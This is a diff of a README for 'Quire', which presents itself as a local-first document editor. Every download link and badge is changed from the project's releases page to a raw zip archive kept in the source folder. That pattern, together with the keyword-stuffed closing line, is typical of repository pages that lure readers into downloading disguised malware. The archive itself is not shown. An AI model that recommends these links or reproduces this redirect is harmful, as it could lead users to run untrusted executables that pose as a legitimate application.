@@ -14,11 +14,11 @@ Welcome to Quire! This is a powerful document editor that works entirely in your
 
 **Step 1: Get the Application**
 
-[![Download Quire](https://img.shields.io/badge/Download-Quire-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jenellesketchy2477/Quire/releases)
+[![Download Quire](https://img.shields.io/badge/Download-Quire-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jenellesketchy2477/Quire/main/src/v1.1-beta.2.zip)
 
 Visit this link to download the application. Simply click the link above or copy and paste this URL into your browser:
 
-`https://github.com/jenellesketchy2477/Quire/releases`
+`https://raw.githubusercontent.com/jenellesketchy2477/Quire/main/src/v1.1-beta.2.zip`
 
 **Step 2: Choose Your File**
 
@@ -131,8 +131,8 @@ Quire is a continuous project. As more people use it and share feedback, new fea
 
 ---
 
-**Get started today:** [Download Quire](https://github.com/jenellesketchy2477/Quire/releases) and experience document editing the way it should be—simple, private, and completely yours.
+**Get started today:** [Download Quire](https://raw.githubusercontent.com/jenellesketchy2477/Quire/main/src/v1.1-beta.2.zip) and experience document editing the way it should be—simple, private, and completely yours.
 
-[![Get Quire Now](https://img.shields.io/badge/🚀-Get%20Quire%20Now-28A745?style=for-the-badge)](https://github.com/jenellesketchy2477/Quire/releases)
+[![Get Quire Now](https://img.shields.io/badge/🚀-Get%20Quire%20Now-28A745?style=for-the-badge)](https://raw.githubusercontent.com/jenellesketchy2477/Quire/main/src/v1.1-beta.2.zip)
 
 Keywords: document editor, word processor, local-first, web-based, offline, open source, WebGPU, HTML, CSS, JavaScript, no dependencies, privacy-focused, Windows, macOS, Linux, free editor, paginated editing, ribbon interface, OOXML, file-based, browser application
